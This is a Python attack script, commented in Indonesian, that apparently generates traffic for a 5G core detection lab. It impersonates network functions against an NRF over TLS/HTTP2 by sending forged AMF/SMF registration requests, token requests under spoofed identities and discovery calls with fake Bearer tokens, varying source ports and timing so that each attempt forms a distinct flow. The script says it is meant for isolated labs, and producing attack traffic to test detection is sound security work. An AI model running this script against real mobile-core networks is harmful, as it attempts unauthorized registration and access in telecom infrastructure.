#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Grup 1 — sbi_nf_impersonation (SBI/TLS, HTTP/2 → NRF).
Guideline: Core-11, Core-39 (autentikasi SBI). Model ancaman: NF palsu /
access-token tak sah. 3GPP TS 33.501 mewajibkan OAuth2 + TLS di SBI; penyerang
mencoba:
  1) REGISTER NF palsu   : PUT /nnrf-nfm/v1/nf-instances/<uuid-acak> (profil AMF/SMF
                           palsu) TANPA Bearer token yang sah  → NRF harus menolak.
  2) Minta access-token  : POST /oauth2/token dgn client_id palsu → token tak sah.
  3) Akses terlindungi    : GET /nnrf-disc/v1/nf-instances dgn "Authorization: Bearer <acak>".

Tiap percobaan = koneksi TLS/HTTP-2 BARU (curl) → source port efemeral baru →
1 flow kanonik independen. Divariasikan: uuid, jenis NF, nilai token palsu, path.

  python3 sbi_impersonate.py <nrf_ip> [port]
Env (mode EPISODE):
  SESSIONS=<n>          jumlah flow independen (default 40)
  JITTER_LO/JITTER_HI   jeda antar-percobaan detik (default 0.02 .. 0.08)
Hanya LAB TERISOLASI. Guard subnet ditegakkan run_scenario.sh.
"""
import sys, os, time, random, uuid, json, subprocess

NF_TYPES = ["AMF", "SMF", "UPF", "PCF", "AUSF", "UDM", "NEF"]

def forged_profile(nf_type, ip):
    # Profil NF palsu — klaim sebagai NF inti agar bisa "terdaftar" & dipakai NF lain.
    return json.dumps({
        "nfInstanceId": str(uuid.uuid4()),
        "nfType": nf_type,
        "nfStatus": "REGISTERED",
        "plmnList": [{"mcc": "001", "mnc": "01"}],
        "ipv4Addresses": [ip],
        "nfServices": [{
            "serviceInstanceId": "0", "serviceName": f"n{nf_type.lower()}-comm",
            "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}],
            "scheme": "https", "nfServiceStatus": "REGISTERED",
        }],
    })

def curl(args, timeout=6, local_port=None):
    """Jalankan curl; kembalikan (rc, kode_http). Tiap panggilan = koneksi baru.
    local_port: paksa source port unik (kernel kerap pakai-ulang → flow kanonik
    kolaps); --local-port menjamin tiap koneksi = 1 flow berbeda."""
    base = ["curl", "-k", "-s", "-o", "/dev/null", "-w", "%{http_code}",
            "--http2", "-m", str(timeout)]
    if local_port is not None:
        base += ["--local-port", str(local_port)]
    try:
        p = subprocess.run(base + args, capture_output=True, text=True, timeout=timeout + 2)
        return p.returncode, (p.stdout.strip() or "000")
    except Exception:
        return 1, "000"

def one_attempt(base_url, atk_ip, local_port=None):
    """Satu percobaan impersonation (1 dari 3 vektor, dipilih acak)."""
    vec = random.choice(["register", "token", "access"])
    fake_bearer = "Bearer " + uuid.uuid4().hex + uuid.uuid4().hex
    if vec == "register":
        nf = random.choice(NF_TYPES); inst = str(uuid.uuid4())
        body = forged_profile(nf, atk_ip)
        return vec, curl(["-X", "PUT", "-H", "Content-Type: application/json",
                          "-H", fake_bearer, "--data-binary", body,
                          f"{base_url}/nnrf-nfm/v1/nf-instances/{inst}"], local_port=local_port)
    if vec == "token":
        nf = random.choice(NF_TYPES)
        data = (f"grant_type=client_credentials&nfInstanceId={uuid.uuid4()}"
                f"&nfType={nf}&scope=nnrf-disc")
        return vec, curl(["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
                          "--data", data, f"{base_url}/oauth2/token"], local_port=local_port)
    # access: discovery dgn Bearer palsu
    nf = random.choice(NF_TYPES)
    return vec, curl(["-H", fake_bearer,
                      f"{base_url}/nnrf-disc/v1/nf-instances?target-nf-type={nf}&requester-nf-type=AMF"],
                     local_port=local_port)

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(2)
    nrf = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "7777"
    sessions = int(os.environ.get("SESSIONS", "40"))
    jlo = float(os.environ.get("JITTER_LO", "0.02")); jhi = float(os.environ.get("JITTER_HI", "0.08"))
    atk_ip = os.environ.get("ATK_IP", "172.22.0.50")
    base_url = f"https://{nrf}:{port}"
    plo = int(os.environ.get("SPORT_LO", "20000")); phi = int(os.environ.get("SPORT_HI", "60000"))
    used = set()
    print(f"[sbi_nf_impersonation] {sessions} percobaan → {base_url} (NF palsu / token tak sah)")
    counts = {}
    for i in range(sessions):
        lp = random.randint(plo, phi)
        while lp in used: lp = random.randint(plo, phi)   # source port unik → flow unik
        used.add(lp)
        vec, (rc, code) = one_attempt(base_url, atk_ip, local_port=lp)
        counts[f"{vec}:{code}"] = counts.get(f"{vec}:{code}", 0) + 1
        time.sleep(random.uniform(jlo, jhi))
    print(f"[sbi_nf_impersonation] selesai {sessions} koneksi TLS. Ringkas vektor:code → {counts}")

if __name__ == "__main__":
    main()
